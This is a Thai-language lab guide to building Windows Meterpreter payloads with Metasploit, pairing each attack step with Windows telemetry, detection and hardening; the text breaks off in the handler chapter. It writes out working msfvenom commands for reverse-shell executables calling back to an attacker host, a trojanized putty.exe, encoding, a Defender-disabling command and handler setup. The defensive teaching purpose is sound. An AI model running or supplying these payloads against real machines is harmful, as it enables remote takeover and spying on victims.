# คู่มือการทดสอบ Metasploit ระดับสูงสำหรับ Windows 10 Lab — มุมมอง Red Team / Blue Team

> **เอกสารทางเทคนิคด้านความมั่นคงปลอดภัย (Technical Security Guide)**
> โฟกัส: การสร้างและใช้งาน Windows Payload ด้วย Metasploit Framework ภายในห้องทดลองที่ได้รับอนุญาต
> กรอบการวิเคราะห์: **Attack → Windows Telemetry → Blue Team Detection → Investigation → Response**
> อ้างอิงระเบียบวิธี (Methodology): [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red) · MITRE ATT&CK · Skill `blackhat-go`

---

## ⚠️ ข้อความกำกับ (Disclaimer & Authorization Notice)

เอกสารนี้จัดทำขึ้นเพื่อ **การศึกษาและการทดสอบด้านความมั่นคงปลอดภัยในห้องทดลองที่ได้รับอนุญาตอย่างถูกต้อง (Authorized Security Testing Lab)** เท่านั้น

- เครื่อง **Windows 10** ในเอกสารนี้ = เครื่องเป้าหมายทดสอบ (Target Machine) ที่ผู้ทดสอบ **เป็นเจ้าของเอง** และรันอยู่บน VMware Workstation Pro แบบแยกเครือข่าย (Isolated Lab)
- **IP Address ทั้งหมดในเอกสารเป็น IP สมมติ (Fictitious)** สำหรับประกอบคำอธิบาย ห้ามนำไปใช้กับระบบจริงนอกขอบเขต
- ทุกกิจกรรมต้องอยู่ **ภายใน Lab** และ **ห้าม** กระทบระบบ บุคคล หรือเครือข่ายภายนอกที่ไม่ได้อยู่ในขอบเขต
- เอกสารนี้ **ไม่รวม** โค้ดหรือรูทีนที่ทำลายข้อมูลจริง (เช่น การเข้ารหัสไฟล์แบบ Ransomware ที่ใช้งานได้จริง) — ส่วนที่เกี่ยวกับ Ransomware จะอธิบายใน **เชิงพฤติกรรมและการตรวจจับ (Behavioral / Detection)** เท่านั้น (ดูบทที่ 15) เพราะโดยข้อเท็จจริง **Metasploit ไม่มี payload ประเภท Ransomware ให้ใช้**
- เจตนาของเอกสาร: ให้ผู้อ่านเข้าใจความสัมพันธ์ **Red Team Action → Windows Telemetry → Blue Team Detection → Investigation → Response** ไม่ใช่ "ทำตามคำสั่งเพื่อโจมตีระบบ"

> หลักการเขียนตลอดเอกสาร: **ทำอะไร → ทำไปเพื่ออะไร → Windows เกิดอะไรขึ้น → Blue Team เห็นอะไร → ตรวจสอบอย่างไร → ป้องกันอย่างไร**

---

## 📑 สารบัญ (Table of Contents)

| บท | หัวข้อ | มุมมองหลัก |
|----|--------|-----------|
| 0 | ข้อกำหนดการทดสอบ (Assumptions, Scope, Rules of Engagement) | Governance |
| 1 | การเตรียมห้องทดลอง (Lab Preparation) — VMware + Kali + Windows 10 | Setup |
| 2 | แบบจำลองภัยคุกคาม (Threat Model) และการจัดระดับความเสี่ยง | Planning |
| 3 | พื้นฐาน Metasploit Framework ที่จำเป็น | Red / Tooling |
| 4 | การสร้าง Windows Payload ด้วย `msfvenom` (ทีละขั้น) | Red → Blue |
| 5 | การตั้ง Listener / Handler (`multi/handler`) | Red → Blue |
| 6 | การส่งมอบและการรันไฟล์ `.exe` บนเครื่อง Lab (User Execution) | Red → Blue |
| 7 | หลังเครื่องติด: คำสั่ง Post-Exploitation หลัก (Meterpreter) | Red → Blue |
| 8 | พฤติกรรมแบบ Spyware (Keylog / Screenshot / Webcam / Mic) | Red → Blue |
| 9 | การคงอยู่ในระบบ (Persistence) | Red → Blue |
| 10 | การยกระดับสิทธิ์ (Privilege Escalation) | Red → Blue |
| 11 | การสำรวจระบบ (Discovery) | Red → Blue |
| 12 | การเข้าถึงข้อมูลรับรอง (Credential Access) | Red → Blue |
| 13 | การเคลื่อนที่ด้านข้าง (Lateral Movement) — เชิงหลักการใน Lab เครื่องเดียว | Red → Blue |
| 14 | การรวบรวมและนำข้อมูลออก (Collection & Exfiltration) | Red → Blue |
| 15 | Ransomware — เชิงพฤติกรรมและการตรวจจับ (ไม่มีใน Metasploit) | **Blue-only** |
| 16 | Windows Telemetry เชิงลึกสำหรับ Blue Team | Blue |
| 17 | Detection Engineering (การสร้าง Rule / Hunting) | Blue |
| 18 | Incident Response (Triage → Containment → Eradication → Recovery) | Blue |
| 19 | ตาราง MITRE ATT&CK Mapping รวม | Reference |
| 20 | บทเรียนที่ได้และการเสริมความแข็งแกร่ง (Lessons Learned & Hardening) | Blue |
| ผนวก | Cheat Sheet, Fake IP Plan, ตรวจสอบเวอร์ชันเครื่องมือ | Reference |

---

# บทที่ 0 — ข้อกำหนดการทดสอบ (Assumptions, Scope, Rules of Engagement)

ก่อนเริ่มการวิเคราะห์ใด ๆ ต้องระบุสมมติฐาน ขอบเขต และกติกาให้ชัดเจนก่อนเสมอ (นี่คือหลัก Rules of Engagement — RoE ของงาน Red Team ที่ถูกต้องตามระเบียบวิธีใน Claude-Red)

## 0.1 Assumptions (สมมติฐาน — แยกเป็น Fact / Assumption)

| ประเภท | ข้อความ |
|--------|---------|
| **Fact** | Metasploit Framework เป็นเครื่องมือ open-source ที่มี payload ตระกูล Meterpreter สำหรับ Windows จริง (เอกสารนี้ใช้เฉพาะโมดูลที่มีอยู่จริง) |
| **Fact** | เครื่อง Windows 10 และ Kali Linux รันเป็น Virtual Machine บน VMware Workstation Pro เครื่องเดียว |
| **Assumption** | ผู้ทดสอบเป็นเจ้าของเครื่องทั้งหมดใน Lab และมีสิทธิ์เต็มในการทดสอบ |
| **Assumption** | เครือข่าย Lab ถูกแยกออกจากเครือข่ายจริง (Host-only / Isolated) และไม่มีเส้นทางออกอินเทอร์เน็ตที่ใช้โจมตีระบบภายนอกได้ |
| **Assumption** | เครื่อง Windows 10 เป็น Build ที่รองรับ (เช่น 21H2/22H2) — **ตรวจสอบเวอร์ชันจริงก่อนทดสอบเสมอ ห้ามสมมติ Event ID/พฤติกรรมโดยไม่ยืนยัน** |

## 0.2 Scope (ขอบเขต)

**In-Scope**
- เครื่องเป้าหมายเดียว: Windows 10 VM (IP สมมติ `192.168.56.20`)
- เครื่องผู้ทดสอบ: Kali Linux VM (IP สมมติ `192.168.56.10`)
- เฉพาะ payload ที่เกี่ยวกับ **Windows โดยตรง** (ตัดตัวเลือกสำหรับ Linux / macOS / Android / อุปกรณ์อื่นทั้งหมด)

**Out-of-Scope (ห้ามทำ)**
- ระบบ/เครือข่าย/บุคคลภายนอก Lab ทุกชนิด
- การเข้ารหัสหรือทำลายข้อมูลจริง (Destructive Ransomware payload)
- Denial of Service, การโจมตีเป็นวงกว้าง (Mass targeting), Supply-chain compromise
- การนำ payload ออกไปทดสอบนอก Lab

## 0.3 Rules of Engagement (RoE)

1. ถ่าย **Snapshot** ของทุก VM ก่อนเริ่ม และคืนสภาพ (Revert) หลังจบแต่ละบท
2. ปิด **Bridged/NAT networking** ระหว่างการทดสอบ payload — ใช้ **Host-only** เท่านั้น
3. บันทึก (Logging) ทุกคำสั่งที่รัน เพื่อใช้เป็นหลักฐานเปรียบเทียบกับ Telemetry ฝั่ง Blue Team
4. หากตัวอย่างใดเสี่ยงต่อระบบจริง ให้เปลี่ยนเป็นตัวอย่างจำลองหรืออธิบายเฉพาะหลักการ
5. ห้ามสมมติว่าการเข้าถึงระบบภายนอก Lab ได้รับอนุญาต — ทุกอย่างจำกัดใน Lab

## 0.4 แผน IP สมมติ (Fake IP Plan) — ใช้ตลอดเอกสาร

| บทบาท | Hostname (สมมติ) | IP (สมมติ) | หมายเหตุ |
|-------|------------------|-----------|----------|
| Attacker (Kali) | `kali-lab` | `192.168.56.10` | เครื่องผู้ทดสอบ / C2 |
| Target (Windows 10) | `WIN10-LAB` | `192.168.56.20` | เครื่องเป้าหมาย |
| (สำรอง) Blue Team Collector | `siem-lab` | `192.168.56.30` | ถ้าตั้ง SIEM/ELK แยก |
| Gateway (Host-only) | — | `192.168.56.1` | VMware Host-only adapter |

> ทุก IP ข้างต้นเป็นค่าสมมติในช่วง `192.168.56.0/24` ซึ่งเป็นช่วงที่นิยมใช้กับ Host-only ของ VMware — ปรับให้ตรงกับ Lab จริงของคุณ และ **อย่าใช้ IP ขององค์กร/บุคคลจริง**

---

# บทที่ 1 — การเตรียมห้องทดลอง (Lab Preparation)

## 1.1 Objective
เตรียม Lab ที่ปลอดภัยและแยกจากเครือข่ายจริง ประกอบด้วย Kali Linux (ผู้ทดสอบ + C2) และ Windows 10 (เป้าหมาย) โดยที่ Windows 10 มี Telemetry ครบเพื่อให้ Blue Team สังเกตพฤติกรรมได้

## 1.2 Prerequisites
- VMware Workstation Pro
- ISO ของ Kali Linux (รุ่นล่าสุด) และ Windows 10 (Evaluation/สื่อที่ถูกลิขสิทธิ์ของคุณเอง)
- ทรัพยากรขั้นต่ำแนะนำ: Kali 2 vCPU / 4 GB RAM, Windows 10 2 vCPU / 4 GB RAM

## 1.3 Lab Environment — โครงสร้างเครือข่าย

```
          VMware Host-only Network (vmnet1)  — 192.168.56.0/24  (Isolated, no Internet)
          ┌───────────────────────────────────────────────────────────┐
          │                                                           │
   ┌──────┴───────┐                                          ┌────────┴────────┐
   │  Kali Linux  │  192.168.56.10                           │   Windows 10    │  192.168.56.20
   │  (Attacker / │◄────────── reverse connection ──────────►│   (Target Lab)  │
   │   C2 / MSF)  │            (payload โทรกลับหา C2)          │  Defender/Logs  │
   └──────────────┘                                          └─────────────────┘
```

**เหตุผลที่ใช้ Host-only:** payload แบบ reverse (เช่น `reverse_tcp`, `reverse_https`) จะให้เครื่องเป้าหมาย "โทรกลับ" มาที่ Kali การใช้ Host-only ทำให้ traffic วิ่งเฉพาะภายใน Lab ไม่รั่วออกอินเทอร์เน็ต

## 1.4 ขั้นตอนเตรียม VMware (สรุปเป็นลำดับ)

1. สร้าง Virtual Network แบบ Host-only ใน **VMware > Edit > Virtual Network Editor** (เช่น `vmnet1` = `192.168.56.0/24`)
2. ติดตั้ง **Kali Linux VM** → ผูก Network Adapter เข้ากับ Host-only (`vmnet1`)
3. ติดตั้ง **Windows 10 VM** → ผูก Network Adapter เข้ากับ Host-only (`vmnet1`) เดียวกัน
4. ตั้ง IP ให้ตรงตามแผน (บทที่ 0.4) — Static หรือกำหนดผ่าน DHCP ของ Host-only
5. **ถ่าย Snapshot ทั้งสองเครื่องในสถานะ "Clean Baseline"** ตั้งชื่อชัดเจน เช่น `baseline-clean`

> **สำคัญ:** เอกสารนี้ไม่ใช้ WSL อีกต่อไปตามที่กำหนด — Kali รันเป็น VM เต็มบน VMware เพื่อให้ networking (โดยเฉพาะ listener แบบ reverse) เสถียรและแยกจากโฮสต์จริงชัดเจน

## 1.5 ตรวจสอบการเชื่อมต่อ (Connectivity Check)

บน Kali:
```bash
# ตรวจสอบ IP ของ Kali ว่าตรงตามแผน
ip addr show
# ทดสอบว่ามองเห็นเครื่อง Windows เป้าหมายใน Lab
ping -c 4 192.168.56.20
```

บน Windows 10 (PowerShell):
```powershell
# ตรวจสอบ IP ของเครื่องเป้าหมาย
Get-NetIPAddress -AddressFamily IPv4 | Format-Table IPAddress, InterfaceAlias
# ทดสอบว่ามองเห็น Kali
Test-Connection 192.168.56.10 -Count 4
```

## 1.6 เปิด Telemetry บน Windows 10 Lab (สำคัญมากสำหรับ Blue Team)

เพื่อให้ Blue Team "มองเห็น" พฤติกรรมของ Red Team เราต้องเปิด logging บนเครื่องเป้าหมายก่อน (ในสถานการณ์จริง Blue Team ต้องทำสิ่งเหล่านี้ล่วงหน้า — เรียกว่า Detection Readiness)

**1) เปิด Process Creation Auditing + Command-line ใน Event ID 4688**
```powershell
# เปิด audit สำหรับ Process Creation (Security log Event ID 4688)
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```
เปิดการบันทึก command-line ใน 4688 ผ่าน Group Policy:
`Computer Configuration > Administrative Templates > System > Audit Process Creation > Include command line in process creation events = Enabled`
(หรือ Registry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled = 1`)

**2) เปิด PowerShell Script Block Logging (Event ID 4104) และ Module Logging (4103)**
ผ่าน Group Policy:
`Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`
- `Turn on Module Logging = Enabled`
- `Turn on PowerShell Script Block Logging = Enabled`

**3) ติดตั้ง Sysmon (ถ้าใช้ใน Lab)** — เพิ่ม telemetry เชิงลึก (Process create = Sysmon Event ID 1, Network = 3, Image load = 7, ฯลฯ)
```powershell
# ดาวน์โหลด Sysmon (Sysinternals) และติดตั้งด้วยไฟล์ config
# ตัวอย่างการติดตั้ง (ใช้ไฟล์ config ที่คุณเลือกใน Lab)
Sysmon64.exe -accepteula -i sysmon-config.xml
```
> Sysmon config ยอดนิยมสำหรับ Lab เช่น "SwiftOnSecurity/sysmon-config" (อ้างอิงภายนอก — ยืนยันเวอร์ชันก่อนใช้)

**4) ยืนยันสถานะ Windows Defender และ Firewall**
```powershell
Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled
Get-NetFirewallProfile | Select-Object Name, Enabled
```

## 1.7 หมายเหตุเรื่อง Defender ใน Lab (ระเบียบวิธีที่ซื่อสัตย์)

**Fact:** payload มาตรฐานจาก `msfvenom` (เช่น `windows/x64/meterpreter/reverse_tcp` แบบไม่เข้ารหัส/ไม่ obfuscate) มักถูก **Windows Defender ตรวจจับและกักได้ทันที** เพราะมี signature ที่รู้จักกันดี

**เพื่อการเรียนรู้แบบมีระเบียบ** ให้ใช้แนวทางสองรอบ:
- **รอบ A (สังเกตพฤติกรรม):** ใน Snapshot ที่ **ปิด Real-time Protection ชั่วคราว** เพื่อให้ payload รันและเราสังเกต Telemetry/พฤติกรรมได้ครบ (ทำใน Lab ปิดเท่านั้น)
- **รอบ B (สังเกตการตรวจจับ):** ใน Snapshot ที่ **เปิด Defender ตามปกติ** เพื่อดูว่า Defender ตรวจจับ/แจ้งเตือนอย่างไร (Event ID 1116/1117 ใน Defender Operational log)

การปิด Defender ชั่วคราวใน Lab ทำได้ (เฉพาะเครื่องทดสอบของคุณ):
```powershell
# เฉพาะใน Lab ที่คุณเป็นเจ้าของ และควรทำใน Snapshot แยกเท่านั้น
Set-MpPreference -DisableRealtimeMonitoring $true
```
> เมื่อจบให้ Revert Snapshot กลับสู่ baseline ทันที — อย่าปล่อยเครื่องที่ปิดการป้องกันค้างไว้

## 1.8 Expected Result
- Kali (`192.168.56.10`) และ Windows 10 (`192.168.56.20`) ping กันได้ภายใน Host-only
- Windows 10 เปิด Event ID 4688 (+command line), PowerShell 4104, (ถ้ามี) Sysmon
- มี Snapshot `baseline-clean` ของทั้งสองเครื่อง

## 1.9 Lessons Learned (บทที่ 1)
- Detection เริ่มต้นที่ "การเปิด Telemetry ล่วงหน้า" — ถ้าไม่เปิด logging ไว้ก่อน Blue Team จะไม่มีอะไรให้ตรวจสอบ
- การแยกเครือข่าย (Isolation) คือเส้นแบ่งระหว่าง "การทดสอบที่ปลอดภัย" กับ "อุบัติเหตุกระทบระบบจริง"

# บทที่ 2 — แบบจำลองภัยคุกคาม (Threat Model) และการจัดระดับความเสี่ยง

## 2.1 Objective
กำหนดว่าใน Lab นี้เรากำลังจำลอง "ผู้โจมตีแบบใด" และประเมินความเสี่ยงของแต่ละเทคนิคอย่างมีหลักเกณฑ์

## 2.2 ผู้โจมตีที่จำลอง (Adversary Profile)
- **ระดับ:** ผู้โจมตีที่ใช้เครื่องมือสำเร็จรูป (Commodity tooling) — ใช้ Metasploit + Meterpreter
- **เป้าหมาย (Objective):** เข้าถึงเครื่อง Windows 10 ผ่าน payload ที่ผู้ใช้รันเอง (User Execution) แล้วทำ post-exploitation แบบสอดแนม (Spyware-like: keylog, screenshot) และคงอยู่ในระบบ (Persistence)
- **ข้อจำกัดที่จำลอง:** ไม่มี 0-day, พึ่งพา social engineering ให้เหยื่อรันไฟล์ `.exe`

## 2.3 Attack Surface (พื้นผิวการโจมตีในสถานการณ์นี้)
- **ช่องทาง Initial Access หลัก:** ผู้ใช้บนเครื่อง Windows 10 ดาวน์โหลดและ **รันไฟล์ `.exe`** ที่สร้างจาก msfvenom (จำลองไฟล์แนบอีเมล/ไฟล์ปลอม)
- ปัจจัยประกอบ: การตั้งค่า Defender, การมองเห็น outbound network, สิทธิ์ของผู้ใช้ (Standard vs Admin)

## 2.4 Attack Path (ลำดับการโจมตีระดับสูง)
```
[1] สร้าง payload (msfvenom)  →  [2] ตั้ง handler (multi/handler)  →
[3] ส่งมอบ + เหยื่อรัน .exe (User Execution)  →  [4] ได้ Meterpreter session  →
[5] Discovery / Priv-Esc  →  [6] Credential Access  →  [7] Persistence  →
[8] Collection (spyware)  →  [9] Exfiltration  →  [10] (Blue) Detect → Respond
```
เอกสารจะไล่ตามลำดับนี้ในบทที่ 4–14 โดยแต่ละขั้นมี Blue Team counterpart เสมอ

## 2.5 การจัดระดับความเสี่ยง (Risk Rating Method)
ประเมินด้วย 5 ปัจจัย — และ **ต้องอธิบายเหตุผลทุกครั้ง** (ไม่สร้างคะแนนลอย ๆ):

| ปัจจัย | ความหมาย |
|--------|----------|
| Impact | ผลกระทบต่อความลับ/บูรณภาพ/ความพร้อมใช้ (CIA) |
| Likelihood | โอกาสที่เทคนิคจะสำเร็จในสภาพจริง |
| Detectability | โอกาสที่ Blue Team จะตรวจจับได้ (สูง = ตรวจง่าย) |
| Privilege Required | สิทธิ์ที่ต้องมีก่อนใช้เทคนิค |
| Attack Complexity | ความยากในการดำเนินการ |

ตัวอย่างการใช้จริงจะปรากฏท้ายบทเทคนิคสำคัญ (บทที่ 6–14) โดยระบุเหตุผลกำกับ

## 2.6 MITRE ATT&CK — กรอบการจัดหมวด (ใช้ตลอดเอกสาร)
เราจะ map แต่ละกิจกรรมเข้ากับ Tactic/Technique จริงของ MITRE ATT&CK (ยืนยัน ID กับเว็บ attack.mitre.org เสมอ — ห้ามแต่ง ID):

| Tactic | รหัส | ปรากฏในบท |
|--------|------|-----------|
| Initial Access | TA0001 | 6 |
| Execution | TA0002 | 6 |
| Persistence | TA0003 | 9 |
| Privilege Escalation | TA0004 | 10 |
| Defense Evasion | TA0005 | 4, 10, 18 |
| Credential Access | TA0006 | 12 |
| Discovery | TA0007 | 11 |
| Lateral Movement | TA0008 | 13 |
| Collection | TA0009 | 8, 14 |
| Command and Control | TA0011 | 5, 7 |
| Exfiltration | TA0010 | 14 |
| Impact | TA0040 | 15 |

---

# บทที่ 3 — พื้นฐาน Metasploit Framework ที่จำเป็น

## 3.1 Objective
ทำความเข้าใจส่วนประกอบของ Metasploit ที่ใช้จริงในเอกสาร: `msfconsole`, `msfvenom`, ฐานข้อมูล และ workspace

## 3.2 เริ่มต้นบน Kali

**1) เตรียมฐานข้อมูลของ Metasploit (เก็บ session/host/loot)**
```bash
# เริ่มบริการฐานข้อมูล PostgreSQL และ initialize schema ของ msf
sudo msfdb init
# ตรวจสอบสถานะฐานข้อมูล
sudo msfdb status
```

**2) เปิด msfconsole**
```bash
msfconsole -q      # -q = quiet (ไม่โชว์ banner)
```

**3) ตรวจสอบการเชื่อมต่อฐานข้อมูลภายใน msfconsole**
```
db_status
```
ผลลัพธ์ที่คาดหวัง: `Connected to msf. Connection type: postgresql.`

**4) สร้าง workspace แยกต่อการทดสอบ (จัดระเบียบข้อมูล)**
```
workspace -a win10-lab      # สร้าง workspace ชื่อ win10-lab
workspace win10-lab         # สลับเข้าใช้งาน
workspace                   # แสดงรายการ workspace
```

## 3.3 คำสั่งสำรวจโมดูล (ใช้บ่อย)
```
search type:payload platform:windows meterpreter     # ค้นหา payload windows meterpreter ที่มีจริง
info windows/x64/meterpreter/reverse_tcp             # ดูรายละเอียดโมดูล
show options                                         # ดูตัวเลือกของโมดูลที่กำลัง use
```

## 3.4 โครงสร้างชื่อ Payload ของ Windows (อ่านให้ออก)
รูปแบบ: `windows/<arch>/<payload>/<stager>`
- `windows/x64/meterpreter/reverse_tcp` → 64-bit, Meterpreter, โทรกลับด้วย TCP (staged)
- `windows/x64/meterpreter_reverse_https` → 64-bit, Meterpreter, HTTPS (stageless เมื่อใช้ `_` เชื่อม)
- `windows/meterpreter/reverse_tcp` → 32-bit (x86)

> **หลักการ:** `reverse_*` = เครื่องเป้าหมายโทรกลับหา C2 (เหมาะกับ Lab หลัง NAT/Firewall) ส่วน `bind_*` = C2 โทรเข้าหาเป้าหมาย (ต้องเปิดพอร์ตที่เป้าหมาย มักโดน Firewall บล็อก)

## 3.5 Blue Team perspective (บทที่ 3)
ในบทนี้ยังไม่มีกิจกรรมบนเครื่องเป้าหมาย — แต่ Blue Team ควรรู้ว่า:
- **ชื่อ default `Meterpreter`, ค่า default ต่าง ๆ** (เช่น named pipe, certificate ปลอมของ reverse_https) เป็น IoC ที่วิเคราะห์ได้ (ดูบทที่ 16–17)
- การมี PostgreSQL/msfconsole เป็นกิจกรรมฝั่งผู้ทดสอบ ไม่ทิ้งร่องรอยบนเป้าหมาย

---

# บทที่ 4 — การสร้าง Windows Payload ด้วย `msfvenom` (ทีละขั้น)

## 4.1 Objective
สร้างไฟล์ `.exe` ที่เป็น Meterpreter payload สำหรับ Windows 10 เป้าหมาย พร้อมเข้าใจว่าแต่ละตัวเลือกทำอะไร และ Windows/Blue Team จะเห็นอะไร

## 4.2 Prerequisites
- ทราบ IP ของ Kali (LHOST = `192.168.56.10`) และพอร์ตที่จะรับ (LPORT เช่น `4444`)
- อยู่บน Kali (msfvenom เป็นเครื่องมือ command-line แยกจาก msfconsole)

## 4.3 สำรวจตัวเลือกที่ใช้ได้จริงก่อน (ห้ามเดา)
```bash
# แสดง payload ทั้งหมด แล้วกรองเฉพาะ windows meterpreter
msfvenom -l payloads --platform windows | grep meterpreter

# แสดง format ที่ส่งออกได้ (exe, dll, psh, hta-psh, ...)
msfvenom --list formats

# แสดง encoders ที่มี
msfvenom -l encoders
```

## 4.4 ขั้นที่ 1 — สร้าง payload `.exe` พื้นฐาน (x64 reverse_tcp)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.10 \
  LPORT=4444 \
  -f exe \
  -o /home/kali/lab/win10_test.exe
```
**คำสั่งนี้ทำอะไร (ทีละส่วน):**
- `-p windows/x64/meterpreter/reverse_tcp` : เลือก payload — Meterpreter 64-bit ที่จะโทรกลับด้วย TCP
- `LHOST=192.168.56.10` : IP ของ **Kali (C2)** ที่ payload จะโทรกลับหา (ใช้ IP สมมติของ Lab)
- `LPORT=4444` : พอร์ตปลายทางที่ Kali จะเปิดรับ
- `-f exe` : ส่งออกเป็นไฟล์ Windows executable
- `-o .../win10_test.exe` : path ไฟล์ผลลัพธ์

**ผลลัพธ์:** ได้ไฟล์ `win10_test.exe` — ไฟล์นี้คือ "malware ทดสอบ" ของ Lab

## 4.5 ขั้นที่ 2 (ทางเลือก) — ใช้ reverse_https เพื่อจำลอง C2 ที่แนบเนียนขึ้น

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.56.10 \
  LPORT=8443 \
  -f exe \
  -o /home/kali/lab/win10_https.exe
```
**ทำไม:** `reverse_https` ห่อ traffic ใน TLS ทำให้ payload ของ session ถูกเข้ารหัส (ยากต่อการอ่านเนื้อหาโดยตรง) — เป็นการจำลองเทคนิค **Encrypted Channel (T1573)** ที่ Blue Team ต้องพึ่ง metadata/behavior แทนการอ่าน payload

## 4.6 ขั้นที่ 3 (ทางเลือก) — Encoding / Iterations (เข้าใจข้อจำกัดจริง)

```bash
# ตัวอย่าง encode ด้วย shikata_ga_nai (ใช้ได้กับ x86 เท่านั้น) 10 รอบ
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.56.10 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o /home/kali/lab/win10_enc.exe
```
**ข้อเท็จจริงที่ต้องพูดตรง ๆ (Fact, ไม่ใช่การขาย):**
- `x86/shikata_ga_nai` เป็น **x86 encoder** ใช้กับ payload **x86** เท่านั้น — payload x64 ต้องใช้ encoder ตระกูล `x64/*` (เช่น `x64/xor`, `x64/zutto_dekiru`)
- **Encoding ≠ การหลบ AV** — Defender ยุคใหม่ตรวจจับด้วย behavior/heuristic + signature ของ Meterpreter stub การ encode หลายรอบ **มักไม่ช่วยหลบ Defender** และบางครั้งทำให้ไฟล์ยิ่งน่าสงสัย
- จุดประสงค์ใน Lab: เพื่อ **สังเกตว่า Blue Team ยังตรวจจับได้หรือไม่** เมื่อ payload ถูก encode ไม่ใช่เพื่อรับประกันการหลบเลี่ยง

## 4.7 ขั้นที่ 4 (ทางเลือก) — ฝัง payload ใน template `.exe` ที่ดูปกติ

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.10 LPORT=4444 \
  -x /home/kali/lab/putty.exe -k \
  -f exe -o /home/kali/lab/win10_backdoored.exe
```
**คำสั่งนี้ทำอะไร:**
- `-x putty.exe` : ใช้โปรแกรมปกติ (template) เป็นเปลือก
- `-k` : พยายามคงฟังก์ชันเดิมของ template ไว้ (payload รันเป็น thread แยก)
- **จำลองเทคนิค Trojanized/Bundled Installer** — ไฟล์ดู "ปกติ" แต่แฝง payload

> **หมายเหตุความปลอดภัย:** ใช้เฉพาะไบนารีที่คุณมีสิทธิ์ใช้งานใน Lab เท่านั้น ห้ามนำไฟล์นี้ออกนอก Lab

## 4.8 ขั้นที่ 5 — สร้างเป็นบริการ (exe-service) สำหรับทดสอบ Persistence

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.10 LPORT=4444 \
  -f exe-service \
  -o /home/kali/lab/win10_service.exe
```
`-f exe-service` สร้าง executable ที่ติดตั้งเป็น Windows Service ได้ (ใช้ประกอบบทที่ 9 — Persistence)

## 4.9 ตรวจสอบไฟล์ที่สร้าง
```bash
ls -lh /home/kali/lab/
file /home/kali/lab/win10_test.exe        # ยืนยันว่าเป็น PE32+/PE executable
sha256sum /home/kali/lab/win10_test.exe   # บันทึก hash ไว้เทียบกับฝั่ง Blue Team
```
> **บันทึก SHA-256 ไว้เสมอ** เพื่อให้ Blue Team ใช้เป็น **static IoC** ในการค้นหา/ยืนยันไฟล์เดียวกันบนเครื่องเป้าหมาย

## 4.10 Windows Telemetry / Blue Team ที่เกี่ยวข้องกับ "การสร้าง payload"
การ **สร้าง** payload เกิดบน Kali จึงไม่มี artifact บน Windows — แต่ **หลังส่งไฟล์เข้าเครื่อง Windows** Blue Team จะเห็น:
- **การเขียนไฟล์ใหม่** (Sysmon Event ID 11 — FileCreate) ใน `Downloads`/`Temp`
- **Mark-of-the-Web (MOTW)**: ไฟล์ที่ดาวน์โหลดจากเว็บจะมี Zone.Identifier ADS (`:Zone.Identifier`) — เป็นสัญญาณว่าไฟล์มาจากภายนอก
- ถ้า Defender เปิด: **Event ID 1116/1117** (Microsoft-Windows-Windows Defender/Operational) เมื่อพบ signature ของ Meterpreter

**ตรวจสอบ MOTW บน Windows:**
```powershell
Get-Content .\win10_test.exe -Stream Zone.Identifier -ErrorAction SilentlyContinue
```

## 4.11 Detection (บทที่ 4)
- **Static:** hash (SHA-256) ที่เราบันทึกไว้; signature ของ Meterpreter ที่ Defender รู้จัก
- **Behavioral:** ไฟล์ `.exe` ที่เพิ่งเขียนใน `%TEMP%`/`Downloads` แล้วถูกรันในเวลาไล่เลี่ยกัน + มี MOTW

## 4.12 Mitigation (บทที่ 4)
- เปิด **SmartScreen** และ **Attack Surface Reduction (ASR)** rules
- บล็อกการรัน executable จากโฟลเดอร์ผู้ใช้ด้วย **AppLocker / WDAC**
- เปิด Defender Real-time + Cloud-delivered protection

## 4.13 MITRE ATT&CK Mapping (บทที่ 4)
- **T1027** Obfuscated Files or Information (encoding, template embedding)
- **T1587.001 / T1588** (Develop/Obtain Capabilities — บริบทฝั่งสร้างเครื่องมือ)
- **T1036** Masquerading (การฝังใน template ให้ดูปกติ)

## 4.14 Expected Result (บทที่ 4)
- ได้ไฟล์ payload `.exe` อย่างน้อย 1 ไฟล์บน Kali พร้อม SHA-256 ที่บันทึกไว้
- เข้าใจว่า encoding ไม่ใช่การรับประกันการหลบ AV

## 4.15 Lessons Learned (บทที่ 4)
- payload มาตรฐานของ msfvenom = "เสียงดัง" ต่อ AV สมัยใหม่ → เหมาะเป็นกรณีศึกษาการตรวจจับ
- ทุกไฟล์ที่สร้าง = IoC ที่ Blue Team ควรตามรอยได้ (hash + path + MOTW)

# บทที่ 5 — การตั้ง Listener / Handler (`multi/handler`)

## 5.1 Objective
เปิดตัวรับการเชื่อมต่อ (Handler) บน Kali ให้ตรงกับ payload ที่สร้าง เพื่อรอ Meterpreter session จากเครื่องเป้าหมาย

## 5.2 Prerequisites
- payload ถูกสร้างด้วย `LHOST=192.168.56.10 LPORT=4444` (บทที่ 4)
- อยู่ใน `msfconsole` (workspace `win10-lab`)

## 5.3 ขั้นตอนตั้ง Handler (ทีละคำสั่ง)
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
set ExitOnSession false
exploit -j
```
**อธิบายทีละบรรทัด:**
- `use exploit/multi/handler` : โมดูลอเนกประสงค์สำหรับ "รอรับ" payload
- `set PAYLOAD ...` : **ต้องตรงกับ payload ที่ msfvenom สร้างทุกตัวอักษร** (ชนิด + arch + stager)
- `set LHOST/LPORT` : ต้องตรงกับที่ฝังในไฟล์ `.exe`
- `set ExitOnSession false` : ไม่ปิด handler หลังได้ session แรก (รับได้หลาย session)
- `exploit -j` : รันแบบ background job (ดูด้วย `jobs`)

**สำหรับ reverse_https** (ถ้าใช้ไฟล์จากข้อ 4.5):
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.56.10
set LPORT 8443
set ExitOnSession false
exploit -j
```

## 5.4 คำสั่งจัดการ job / session ที่เกี่ยวข้อง
```
